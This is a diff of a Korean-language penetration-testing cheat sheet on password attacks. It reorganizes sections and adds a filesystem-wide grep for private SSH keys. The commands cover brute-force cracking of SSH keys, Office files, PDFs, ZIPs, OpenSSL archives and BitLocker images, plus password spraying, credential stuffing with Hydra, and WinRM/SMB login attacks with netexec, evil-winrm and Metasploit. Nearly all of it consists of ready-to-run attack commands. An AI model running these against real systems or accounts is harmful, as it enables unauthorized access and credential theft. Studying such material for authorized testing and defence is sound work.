@@ -104,16 +104,57 @@ $! c so0 sa@
 - 깊이(`-d`), 단어의 최소 길이(`-m`), 검색된 단어의 소문자 저장(`--lowercase`), 그리고 결과를 저장할 파일(`-w`)<br/>
 ```cewl https://www.domain.com -d 4 -m 6 --lowercase -w inlane.wordlist```
 
+<br/><br/>
+# 3. Hunting for Encrypted Files
 
+### SSH Key Cracking
+- `grep`와 같은 도구로 SSH 개인키 검색<br/>
+```$ grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null```
+- SSH 키가 암호화되었는지 확인하기 위해 `ssh-keygen`을 사용하여 키를 읽어 봄<br/>
+```ssh-keygen -yf ~/.ssh/id_ed25519```
+```
+ssh2john.py SSH.private > ssh.hash
+john --wordlist=rockyou.txt ssh.hash
+john ssh.hash --show
+```
 
+### Cracking Documents
+```
+office2john.py Protected.docx > protected-docx.hash
+john --wordlist=rockyou.txt protected-docx.hash
+```
 
+### Cracking PDFs
+```
+pdf2john.py PDF.pdf > pdf.hash
+john --wordlist=rockyou.txt pdf.hash
+```
+
+### Cracking ZIP
+```
+zip2john ZIP.zip > zip.hash
+john --wordlist=rockyou.txt zip.hash
+```
+
+### Cracking OpenSSL Encrypted Archives (예 : .gzip)
+```
+file GZIP.gzip 
+for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done
+```
+
+### Cracking BitLocker Encrypted Drives
+```
+bitlocker2john -i Backup.vhd > backup.hashes
+grep "bitlocker\$0" backup.hashes > backup.hash
+hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked
+```
 
 <br/><br/>
-# 3. Remote Password Attacks
+# 4. Remote Password Attacks
 
-### CrackMapExec(NetExec) - WinRM
-```crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>```<br/>
-예) ```crackmapexec winrm 192.168.1.1 -u user.list -p password.list```
+### NetExec(CrackMapExec) - WinRM
+```netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>```<br/>
+예) ```netexec winrm 192.168.1.1 -u user.list -p password.list```
 
 ### Evil-WinRM
 ```evil-winrm -i <target-IP> -u <username> -p <password>```<br/>
@@ -131,24 +172,27 @@ $! c so0 sa@
 ### MSF - SMB (SMBv3)
 ```msf6 > use auxiliary/scanner/smb/smb_login```
 
-### CrackMapExec(NetExec) - SMB Share
+### NetExec(CrackMapExec) - SMB Share
 ```crackmapexec smb 192.168.1.1 -u "user" -p "password" --shares```
 
 ### Smbclient
 ```smbclient -U user \\\\192.168.1.1\\SHARENAME```
 
 <br/><br/>
-# 3. Password 변형
+# 5. Password 재사용 / 기본 Passwords
 
+### Password spraying
+```$ netexec smb 10.100.38.0/24 -u <usernames.list> -p 'ChangeMe123!'```
 
-### Anarchy를 이용한 Custom Username 생성
-```./username-anarchy -i /home/user/names.txt```<br/>
-예) ```./username-anarchy john marston > username.txt```
+### Credential Stuffing - Hydra
+```hydra -C <user_pass.list> <protocol>://<IP>```
 
-<br/><br/>
-# 4. Password 재사용 / 기본 Passwords
+### Default Credentials
+```
+$ pip3 install defaultcreds-cheat-sheet
+$ creds search linksys
+```
 
-### Credential Stuffing
 [DefaultCreds-Cheat-Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet)
 | **Product/Vendor** | **Username** | **Password**                 |
 | ------------------ | ------------ | ---------------------------- |
@@ -184,10 +228,6 @@ $! c so0 sa@
 | ...                | ...          | ...                          |
 |                    |              |                              |
 
-### Credential Stuffing - Hydra
-```hydra -C <user_pass.list> <protocol>://<IP>```
-
-### Default Credentials
 [Default Router Credentials](https://www.softwaretestinghelp.com/default-router-username-and-password-list/)
 
 <br/><br/>
@@ -327,42 +367,4 @@ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.crack
 ### Hashcat으로 MD5 Hash Cracking
 ```hashcat -m 500 -a 0 md5-hashes.list rockyou.txt```
 
-<br/><br/>
-# 7. Cracking Files
 
-### SSH Key Cracking
-```
-ssh2john.py SSH.private > ssh.hash
-john --wordlist=rockyou.txt ssh.hash
-```
-
-### Cracking Documents
-```
-office2john.py Protected.docx > protected-docx.hash
-john --wordlist=rockyou.txt protected-docx.hash
-```
-
-### Cracking PDFs
-```
-pdf2john.py PDF.pdf > pdf.hash
-john --wordlist=rockyou.txt pdf.hash
-```
-
-### Cracking ZIP
-```
-zip2john ZIP.zip > zip.hash
-john --wordlist=rockyou.txt zip.hash
-```
-
-### Cracking OpenSSL Encrypted Archives (예 : .gzip)
-```
-file GZIP.gzip 
-for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done
-```
-
-### Cracking BitLocker Encrypted Drives
-```
-bitlocker2john -i Backup.vhd > backup.hashes
-grep "bitlocker\$0" backup.hashes > backup.hash
-hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked
-```
